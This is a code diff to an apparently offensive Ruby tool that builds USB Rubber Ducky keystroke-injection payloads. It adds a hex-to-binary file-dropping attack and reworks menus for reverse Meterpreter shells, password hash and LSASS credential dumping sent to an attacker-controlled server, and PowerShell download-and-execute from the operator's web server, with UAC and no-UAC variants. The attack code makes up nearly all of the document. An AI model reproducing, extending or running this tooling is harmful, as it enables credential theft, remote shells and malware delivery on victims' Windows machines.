@@ -29,15 +29,30 @@ def server(attack)
       random_name = random_name_gen
       #new_file_name = file_name.gsub(file_name,random_name)
       print_info("Copying #{file_name} to '/var/www/'\n")
-      FileUtils.copy(file_path,"/home/james/test/#{random_name}")
+      FileUtils.copy(file_path,"/var/www/#{random_name}")
       powershell_command = powershell_wget_powershell(host,random_name)
     else
       print_info("Copying #{file_name} to '/var/www/'\n")
-      FileUtils.copy(file_path,"/home/james/test/#{file_name}")
+      FileUtils.copy(file_path,"/var/www/#{file_name}")
       powershell_command = powershell_wget_powershell(host,file_name)
     end
     return powershell_command
   end
+end
+def hex_setup
+  victim_path = 'c:\\windows\\temp\\'
+  file_path = [(get_input('Enter full path to executable: ') ), $stdin.gets.rstrip][1]
+  file_name = file_path.split('/')[-1]
+  hex_string = bin_to_hex(file_path)
+  random_name_answer = [(get_input('Would you like to randomize the file name?[yes/no] ') ), $stdin.gets.rstrip][1]
+  if random_name_answer == 'yes'
+    print_info("Creating Random Name!\n")
+    random_name = random_name_gen
+    powershell_command = powershell_hex_to_bin(hex_string,"#{victim_path}#{random_name}")
+  else
+    powershell_command = powershell_hex_to_bin(hex_string,"#{victim_path}#{file_name}")
+  end
+  return powershell_command
 end
 def meterpreter_setup     
   server_setup = ServerSetUp.new
@@ -70,6 +85,8 @@ def case_main_menu
       case_dump_lsass_menu
     when '4'
       case_wget_menu
+    when '5'
+      case_hex_to_bin_menu
     when '99'
       exit
     else
@@ -79,26 +96,26 @@ def case_main_menu
   end
 end
 def case_reverse_meterpreter_menu
-  reverse_meterpreter_answer = reverse_meterpreter
+  reverse_meterpreter_answer = reverse_meterpreter_menu
   case reverse_meterpreter_answer
     when '1'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
-      meterpreter_uac(encode_command(powershell_command))
+      ducky_meterpreter_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
       compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
     when '2'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
-      meterpreter_no_uac(encode_command(powershell_command))
+      ducky_meterpreter_no_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
       compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
 	  when '3'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
-      meterpreter_low(encode_command(powershell_command))
+      ducky_meterpreter_low(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
       compile_ducky(reverse_meterpreter_file)
       start_msf(host,port)
@@ -112,19 +129,19 @@ def case_reverse_meterpreter_menu
 end
 def case_dump_hashes_menu
   attack = 'hash_dump'
-  dump_hashes_answer = dump_hashes
+  dump_hashes_answer = dump_hashes_menu
   case dump_hashes_answer
     when '1'
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
-      hash_dump_uac(encode_command(powershell_command))
+      ducky_hash_dump_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
       compile_ducky(hash_dump_file)
       start_hash_server(port)
     when '2'
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
-      hash_dump_no_uac(encode_command(powershell_command))
+      ducky_hash_dump_no_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
       compile_ducky(hash_dump_file)
       start_hash_server(port)
@@ -138,19 +155,19 @@ def case_dump_hashes_menu
 end
 def case_dump_lsass_menu
   attack = 'lsass_dump'
-  dump_lsass_answer = dump_lsass
+  dump_lsass_answer = dump_lsass_menu
   case dump_lsass_answer
     when '1'
       host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
-      lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
+      ducky_lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
       print_info("Compiling Text to Bin!\n")
       compile_ducky(lsass_dump_file)
       start_lsass_server(port)
     when '2'
       host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
-      lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
+      ducky_lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
       print_info("Compiling Text to Bin!\n")
       compile_ducky(lsass_dump_file)
       start_lsass_server(port)
@@ -165,31 +182,61 @@ end
 def case_wget_menu
   attack = 'wget'
   ServerSetUp.new.web_server
-  wget_answer = powershell_wget
+  wget_answer = powershell_wget_menu
   case wget_answer
     when '1'
-      powershell_command,executable = server(attack)
+      powershell_command = server(attack)
       print_info("Creating Text File!\n")
-      wget_uac(encode_command(powershell_command))
+      ducky_wget_uac(encode_command(powershell_command))
       compile_ducky(wget_file)
     when '2'
-      powershell_command,executable = server(attack)
+      powershell_command = server(attack)
       print_info("Creating Text File!\n")
-      wget_no_uac(encode_command(powershell_command))
+      ducky_wget_no_uac(encode_command(powershell_command))
       compile_ducky(wget_file)
     when '3'
-      powershell_command,executable = server(attack)
-      print_info("Creating Text File!\n")  
-      wget_low(encode_command(powershell_command))
+      powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_wget_low(encode_command(powershell_command))
       compile_ducky(wget_file)
     when '99'
       case_main_menu
     else
       print_error('Bad Choice')
       sleep(1)
-      case_dump_lsass_menu
+      case_wget_menu
+  end
+end
+def case_hex_to_bin_menu
+  hex_answer = hex_to_bin_menu
+  case hex_answer
+    when '1'
+      powershell_command = hex_setup
+      print_info("Creating Text File!\n")
+      ducky_hex_uac(encode_command(powershell_command))
+      compile_ducky(hex_to_bin_file)
+    when '2'
+      powershell_command = hex_setup
+      print_info("Creating Text File!\n")
+      ducky_hex_no_uac(encode_command(powershell_command))
+      compile_ducky(hex_to_bin_file)
+    when '3'
+      powershell_command = hex_setup
+      print_info("Creating Text File!\n")
+      ducky_hex_low(encode_command(powershell_command))
+      compile_ducky(hex_to_bin_file)
+    when '99'
+      case_main_menu
+    else
+      print_error('Bad Choice')
+      sleep(1)
+      case_hex_to_bin_menu
   end
 end
 begin
-  case_main_menu
+  if Process.uid != 0
+    print_info('Not Running as Root some payloads may not work properly')
+    sleep(2)
+  end
+    case_main_menu
 end
